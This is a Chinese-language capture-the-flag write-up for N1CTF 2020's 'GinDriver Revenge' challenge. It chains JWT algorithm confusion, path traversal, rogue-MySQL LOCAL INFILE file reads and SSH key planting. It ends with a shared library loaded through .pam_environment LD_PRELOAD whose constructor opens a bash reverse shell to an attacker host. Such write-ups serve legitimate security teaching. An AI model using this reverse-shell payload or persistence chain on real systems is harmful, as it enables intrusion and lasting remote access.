# N1CTF 2020 GinDriver Revenge Writeup

## 题目简述

GinDriver Revenge 沿用 GinDriver 的 WebAuthn、JWT 和数据库配置逻辑，但目标从读取 flag 提升为取得交互式 shell。前半段仍是管理员 JWT 算法混淆和 MySQL `LOAD DATA LOCAL INFILE` 任意文件读取；后半段要求把已经获得的文件读写能力转化为 SSH 登录，并利用 PAM 环境变量加载恶意共享库。

## 解题过程

### 取得管理员权限

应用会泄露管理员 WebAuthn 公钥，JWT 验证又允许攻击者选择 HMAC 算法。构造管理员身份的 token，并把公开密钥的原始字节作为 HMAC 密钥签名，服务端会以相同字节完成验证。这样即可进入数据库配置上传与测试接口。

配置上传存在路径穿越。将数据库连接指向攻击者控制的 MySQL 协议服务，并启用本地文件加载后，恶意服务可以向题目服务器上的客户端发送 `LOCAL INFILE` 请求：

```sql
LOAD DATA LOCAL INFILE '/home/gin/.ssh/authorized_keys'
INTO TABLE received
```

同样的方法可读取 `/etc/passwd`、进程环境和用户目录配置，用于确认运行用户、主目录与 SSH 状态。

### 写入 SSH 授权密钥

利用上传文件名的路径穿越，把自己的 SSH 公钥写到目标用户的：

```text
/home/gin/.ssh/authorized_keys
```

写入后即可用对应私钥登录。此时获得的是题目服务用户权限，还未达到 Revenge 所要求的完整利用效果。

### 利用 PAM 环境变量加载共享库

Linux 的 PAM 环境模块会在 SSH 会话建立时读取用户的 `.pam_environment`。将恶意共享库上传到可写位置，例如 `/tmp/exp.so`，再写入：

```text
LD_PRELOAD DEFAULT=/tmp/exp.so
```

共享库使用构造函数，在被加载时建立反向连接：

```c
#include <stdlib.h>

__attribute__((constructor))
static void init(void) {
    system("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'");
}
```

编译为位置无关共享对象并上传：

```bash
gcc -shared -fPIC exp.c -o exp.so
```

重新发起 SSH 登录时，PAM 读取环境文件并预加载 `exp.so`，构造函数先于正常会话逻辑执行，攻击者收到 shell。题目后端会周期性重启，但用户目录中的 `authorized_keys`、`.pam_environment` 和上传文件仍可保留，因此要把持久文件写入与短生命周期进程区分开。

## 方法总结

Revenge 的关键不是再找一个全新的 Web 漏洞，而是把已有原语向操作系统登录链延伸。任意文件读取应先用于枚举身份和目录，任意文件写入应优先寻找能被可信进程主动消费的位置。`.pam_environment` 与 `LD_PRELOAD` 的组合依赖具体 PAM 配置，复现时必须确认 SSH 会话确实加载该模块，不能把它当作所有 Linux 主机都成立的通用结论。
